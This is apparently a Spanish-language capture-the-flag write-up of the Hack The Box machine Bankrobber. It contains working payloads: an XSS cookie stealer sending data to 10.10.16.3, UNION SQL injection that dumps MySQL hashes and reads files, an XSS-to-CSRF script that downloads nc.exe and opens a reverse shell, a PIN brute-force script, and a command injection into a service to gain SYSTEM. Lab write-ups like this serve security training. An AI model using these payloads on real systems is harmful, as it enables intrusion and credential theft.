---
layout: post
title: Bankrobber
date: 2023-04-08
description:
img:
fig-caption:
tags: [OSCP]
---
___

<center><img src="/writeups/assets/img/Bankrobber-htb/Bankrobber.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.154 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-08 13:16 GMT
Nmap scan report for 10.10.10.154
Host is up (0.052s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
445/tcp  open  microsoft-ds
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 26.64 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p80,443,445,3306 10.10.10.154
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-08 13:19 GMT
Nmap scan report for 10.10.10.154
Host is up (0.077s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-title: E-coin
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB (unauthorized)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-04-08T13:20:09
|_  start_date: 2023-04-08T13:15:59

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.82 seconds
```

## Puerto 445 (SMB)

Con ```crackmapexec``` hago un escaneo para ver dominio, hostname y versiones

```null
crackmapexec smb 10.10.10.154
SMB         10.10.10.154    445    BANKROBBER       [*] Windows 10 Pro 14393 (name:BANKROBBER) (domain:Bankrobber) (signing:False) (SMBv1:True)
```

Añado ```Bankrobber``` al ```/etc/hosts```

No puedo listar los recursos compartidos

```null
smbmap -H 10.10.10.154 -u 'null'
[!] Authentication error on 10.10.10.154
```

## Puerto 80 (HTTP) | Puerto 443 (HTTPS)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.10.154
http://10.10.10.154 [200 OK] Apache[2.4.39], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4], IP[10.10.10.154], JQuery[2.2.4], Meta-Author[codepixer], OpenSSL[1.1.1b], PHP[7.3.4], PasswordField[password], Script[text/javascript], Title[E-coin], X-Powered-By[PHP/7.3.4]
```

```null
whatweb https://10.10.10.154
https://10.10.10.154 [200 OK] Apache[2.4.39], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4], IP[10.10.10.154], JQuery[2.2.4], Meta-Author[codepixer], OpenSSL[1.1.1b], PHP[7.3.4], PasswordField[password], Script[text/javascript], Title[E-coin], X-Powered-By[PHP/7.3.4]
```

La página principal se ve así:

<img src="/writeups/assets/img/Bankrobber-htb/1.png" alt="">

Pruebo a registrar al usuario ```admin:admin```. Aparece que ya existe. Pero el mensaje de error lo puedo modificar en un parámetro por GET

<img src="/writeups/assets/img/Bankrobber-htb/2.png" alt="">

Pero no me lleva a nada así que me registro y sigo enumerando. Encuentro un formulario

<img src="/writeups/assets/img/Bankrobber-htb/3.png" alt="">

Al enviar los datos me aparece un mensaje

<img src="/writeups/assets/img/Bankrobber-htb/4.png" alt="">

Un Administrador va a validar la transacción. Pruebo un XSS para tratar de obtener las credenciales del usuario Administrador. Para ello necesito saber como se están tramitando las cookies de sesión

<img src="/writeups/assets/img/Bankrobber-htb/5.png" alt="">

A modo de traza, intento cargar un script hosteado de mi lado. El payload sería el siguiente

```null
<script src="http://10.10.16.3/pwned.js"></script>
```

Recibo la petición

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.154 - - [08/Apr/2023 14:12:00] code 404, message File not found
10.10.10.154 - - [08/Apr/2023 14:12:00] "GET /pwned.js HTTP/1.1" 404 -
```

El valor del ```pwned.js``` es:

```null
var request = new XMLHttpRequest();
request.open('GET', 'http://10.10.16.3/?cookie=' + document.cookie, true);
request.send();
```

Obtengo su cookie de sesión

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.154 - - [08/Apr/2023 14:22:06] "GET /pwned.js HTTP/1.1" 200 -
10.10.10.154 - - [08/Apr/2023 14:22:07] "GET /?cookie=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1" 200 -
```

Las sustituyo en el navegador. Tengo acceso al directorio ```/admin```

Contiene varias secciones

<img src="/writeups/assets/img/Bankrobber-htb/6.png" alt="">

Hay una inyección SQL

<img src="/writeups/assets/img/Bankrobber-htb/7.png" alt="">

Lo intercepto con BurpSuite. El total es de 3 columnas ya que el error desaparece

```null
term=1' order by 3-- -
```

```null
<table width='90%'><tr><th>ID</th><th>User</th></tr>
		<tr>
		    <td>1</td>
		    <td>admin</td>
		 </tr>
		</table>
```

Al aplicar un ordenamiento aparecen los números en la respuesta

`` null
term=1' union select 1,2,3-- -
```

```null
<table width='90%'><tr><th>ID</th><th>User</th></tr>
		<tr>
		    <td>1</td>
		    <td>admin</td>
		 </tr>
		
		<tr>
		    <td>1</td>
		    <td>2</td>
		 </tr>
		</table>
```

Listo las bases de datos totales

```null
term=1' union select 1,group_concat(schema_name),3 from information_schema.schemata-- -
```

```null
<td>bankrobber,information_schema,mysql,performance_schema,phpmyadmin,test</td>
```

Y las tablas para ```mysql```

```null
term=1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema="mysql"-- -
```

```null
<td>column_stats,columns_priv,db,event,func,general_log,gtid_slave_pos,help_category,help_keyword,help_relation,help_topic,host,index_stats,innodb_index_stats,innodb_table_stats,ndb_binlog_index,plugin,proc,procs_priv,proxies_priv,roles_mapping,servers,slave_master_info,slave_relay_log_info,slave_worker_info,slow_log,table_stats,tables_priv,time_zone,time_zone_leap_second,time_zone_name,time_zone_transition,time_zone_transition_type,user</td>
```

Y para esta tabla la columna ```user```

```null
term=1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema="mysql" and table_name="user"-- -
```

```null
<td>Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Create_user_priv,Event_priv,Trigger_priv,Create_tablespace_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,max_updates,max_connections,max_user_connections,plugin,authentication_string,password_expired,is_role,default_role,max_statement_time</td>
```

Me quedo con los usuarios y las contraseñas

```null
term=1' union select 1,group_concat(User,0x3a,Password),3 from mysql.user-- -
```

```null
<td>root:*F435725A173757E57BD36B09048B8B610FF4D0C4,root:*F435725A173757E57BD36B09048B8B610FF4D0C4,root:*F435725A173757E57BD36B09048B8B610FF4D0C4,:,pma:</td>
```

Lo crackeo mediante Rainbow Tables

<img src="/writeups/assets/img/Bankrobber-htb/8.png" alt="">

Pero como no se reutiliza para ningún servicio, intento cargar un archivo a través de la inyección SQL, en este caso el ```hosts```

```null
term=1' union select 1,load_file("C:\\Windows\\System32\\Drivers\\etc\\hosts"),3-- -
```

```null
<td># Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
</td>
```

Obtengo el hash NetNTLMv2 de un usuario

```null
term=1' union select 1,load_file("\\\\10.10.16.3\\shared\pwned.txt"),3-- -
```

```null
impacket-smbserver shared $(pwd)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.154,50509)
[*] AUTHENTICATE_MESSAGE (BANKROBBER\Cortin,BANKROBBER)
[*] User BANKROBBER\Cortin authenticated successfully
[*] Cortin::BANKROBBER:aaaaaaaaaaaaaaaa:87675ff0fde0ffb2fce6e94b531662bb:0101000000000000808c634e386ad9010b02f23b754935c900000000010010004800790079004d0076004d0055004c00030010004800790079004d0076004d0055004c000200100057007000790044006d0056006c0072000400100057007000790044006d0056006c00720007000800808c634e386ad90106000400020000000800300030000000000000000000000000200000e4945d6378c4d16507ed64c73df4e099a477aeda7f64c79b501c3a28e42c78630a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003300000000000000000000000000
[-] TreeConnectAndX not found SHAREDPWNED.TXT
[-] TreeConnectAndX not found SHAREDPWNED.TXT
[*] Disconnecting Share(1:IPC$)
[*] Closing down connection (10.10.10.154,50509)
[*] Remaining connections []
```

Pero no se puede crackear. Otra sección de la web permite ejecutar comandos en caso de ejecutarlo desde el localhost

<img src="/writeups/assets/img/Bankrobber-htb/9.png" alt="">

En ```/phpmyadmin``` se podía ver un error de XAMPP

<img src="/writeups/assets/img/Bankrobber-htb/10.png" alt="">

La petición se está tramitando contra ```backdoorchecker.php```

```null
POST /admin/backdoorchecker.php HTTP/1.1
Host: 10.10.10.154
Cookie: id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D
Content-Length: 7
Sec-Ch-Ua: "Chromium";v="111", "Not(A:Brand";v="8"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://10.10.10.154
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://10.10.10.154/admin/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

cmd=dir
```

Suponiendo que este script se encuentra en el anterior path, lo puedo tratar de obtener a través de la inyección SQL

```null
term=1' union select 1,load_file("C:\\Xampp\\htdocs\\admin\\backdoorchecker.php"),3-- -
```

```null
<td><?php
include('../link.php');
include('auth.php');

$username = base64_decode(urldecode($_COOKIE['username']));
$password = base64_decode(urldecode($_COOKIE['password']));
$bad 	  = array('$(','&');
$good 	  = "ls";

if(strtolower(substr(PHP_OS,0,3)) == "win"){
	$good = "dir";
}

if($username == "admin" && $password == "Hopelessromantic"){
	if(isset($_POST['cmd'])){
			// FILTER ESCAPE CHARS
			foreach($bad as $char){
				if(strpos($_POST['cmd'],$char) !== false){
					die("You're not allowed to do that.");
				}
			}
			// CHECK IF THE FIRST 2 CHARS ARE LS

			if(substr($_POST['cmd'], 0,strlen($good)) != $good){

				die("It's only allowed to use the $good command");
			}

			if($_SERVER['REMOTE_ADDR'] == "::1"){
				system($_POST['cmd']);
			} else{
				echo "It's only allowed to access this function from localhost (::1).<br> This is due to the recent hack attempts on our server.";
			}
	}
} else{
	echo "You are not allowed to use this function!";
}
?></td>
```

Puedo tratar de que abusar del XSS para derivarlo a un CSRF y que el usuario realice la petición por mí en el servidor web. Modifico el ```pwned.js``` para que ejecute el ```nc.exe```

```null
var request = new XMLHttpRequest();
var params = 'cmd=dir|powershell -c "iwr -uri 10.10.16.3/nc.exe -outfile %temp%\\nc.exe"; %temp%\\nc.exe -e cmd.exe 10.10.16.3 443';

request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
request.send(params);
```

Comparto ambos archivos por diferentes puertos, uno en el 80 y otro en el 8000. Envío el payload

```null
<script src="http://10.10.16.3:8000/pwned.js"></script>
```

Gano acceso al sistema en una sesión de netcat

```null
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.154] 50779
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.

C:\xampp\htdocs\admin>
```

Puedo ver la primera flag

```null
C:\Users\Cortin\Desktop>type user.txt
type user.txt
23a40d31993a68a412dd720ba140ea0b
```

# Escalada

El usuario actual pertenece a dos grupos

```null
C:\Users\Cortin\Desktop>net user cortin
net user cortin
Gebruikersnaam                           Cortin
Volledige naam                           
Opmerking                                
Opmerking van gebruiker                  
Landcode                                 031 (Nederland)
Account actief                           Ja
Account verloopt                         Nooit

Wachtwoord voor het laatst ingesteld     25-4-2019 00:29:09
Wachtwoord verloopt                      Nooit
Wachtwoord mag worden gewijzigd          25-4-2019 00:29:09
Wachtwoord vereist                       Ja
Gebruiker mag wachtwoord wijzigen        Ja

Werkstations toegestaan                  Alle
Aanmeldingsscript                        
Gebruikersprofiel                        
Basismap                                 
Meest recente aanmelding                 8-4-2023 12:15:58

Toegestane aanmeldingstijden             Alle

Lidmaatschap lokale groep                *Gebruikers           
Lidmaatschap globale groep               *Geen                 
De opdracht is voltooid.
```

Hay otro usuario local llamado ```Gast```

```null
C:\Users\Cortin\Desktop>net user
net user

Gebruikersaccounts voor \\BANKROBBER

-------------------------------------------------------------------------------
admin                    Administrator            Cortin                   
DefaultAccount           Gast                     
De opdracht is voltooid.
```

En la raíz hay un binario EXE

```null
C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3307-A1DE

 Directory of C:\

25-04-2019  16:50            57.937 bankv2.exe
24-04-2019  21:27    <DIR>          PerfLogs
21-10-2022  10:32    <DIR>          Program Files
21-10-2022  10:34    <DIR>          Program Files (x86)
24-04-2019  15:52    <DIR>          Users
11-01-2021  15:17    <DIR>          Windows
24-04-2019  21:18    <DIR>          xampp
               1 File(s)         57.937 bytes
               6 Dir(s)   5.197.086.720 bytes free
```

Al intentar ejecutarlo no tengo acceso

```
C:\>.\bankv2.exe
.\bankv2.exe
Toegang geweigerd.
```

Al hacer un ```netstat -nat``` veo que el puerto 910 está abierto internamente

```null
TCP    0.0.0.0:910            0.0.0.0:0              LISTENING       InHost
```

Con ```tasklist``` obtengo el identificador del proceso

```null
bankv2.exe                    1792                            0        132 K
```

Me conecto con ```netcat```

```null
C:\Users\Cortin\AppData\Local\Temp>.\nc.exe localhost 910
.\nc.exe localhost 910

 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 
```

Tengo que introducir un código. Para bruteforcearlo, subo el ```chisel``` y poder conectarme al puerto 910 desde mi equipo. 

En mi equipo me conecto como cliente

```null
chisel server -p 1234 --reverse
```

Me conecto como cliente

```null
PS C:\Users\Cortin\AppData\Local\Temp> .\chisel.exe client 10.10.16.3:1234 R:socks
```

Creo un diccionario con todos los posibles pines con bash

```null
for i in {0000..9999}; do echo $i; done > dictionary.txt
```

Creo un script en python

```null
from pwn import *

def def_handler(sig, frame):
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

def bruteforce():

    p1 = log.progress("Bruteforcing...")

    pins = open("dictionary.txt", "r")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    for pin in pins:

        p1.status("Testing pin %s/9999" % pin.strip('\n'))

        s.connect(('127.0.0.1', 910))
        data = s.recv(4096)

        s.send(pin.encode())

        data = s.recv(1024)

        if b'Access denied' not in data:
            print("Pin %s correct" % pin)
            break



if __name__ == '__main__':

    bruteforce()
```

Y lo ejecuto

```null
proxychains python3 bruteforce.py
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[◣] Bruteforcing...: Testing pin 0021/9999
Pin 0021
 correct
```

Obtengo el pin correcto. Al volver a ejecutarlo, se leakea la ruta de otro binario

```null
proxychains nc 10.10.10.154 910
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] 1
 [$] Transfering $1 using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe

 [$] Transaction in progress, you can safely disconnect...
```

Em caso de introducir muchas "A", el nombre del binario que se ejecuta cambia

```null
proxychains nc 10.10.10.154 910
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Creo un patrón para encontrar el offset

```null
pattern_create.rb -l 500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
```

Y ejecuto

```null
proxychains nc 10.10.10.154 910
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
 [$] Transfering $Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: 0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae
```

El offset es de 32

```null
pattern_offset.rb -q 0Ab1
[*] Exact match at offset 32
```

El payload sería así:

```null
python3 -c 'print("A"*32 + "C:\\Users\\Cortin\\AppData\Local\Temp\\nc.exe -e cmd 10.10.16.3 443")'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Cortin\AppData\Local\Temp\nc.exe -e cmd 10.10.16.3 443
```

Ejecuto de nuevo y gano acceso como el usuario ```nt authority\system```

```null
proxychains nc 10.10.10.154 910
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Cortin\AppData\Local\Temp\nc.exe -e cmd 10.10.16.3 443
 [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Cortin\AppData\Local\Temp\nc.exe -e cmd 10.10.16.3 443 using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: C:\Users\Cortin\AppData\Local\Temp\nc.exe -e cmd 10.10.16.3 443

 [$] Transaction in progress, you can safely disconnect...
```

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.154.
Ncat: Connection from 10.10.10.154:49789.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Puedo ver la segunda flag

```null
C:\Users\admin\Desktop>type root.txt
type root.txt
e64f2f507289a76607fbb10fb2252927
```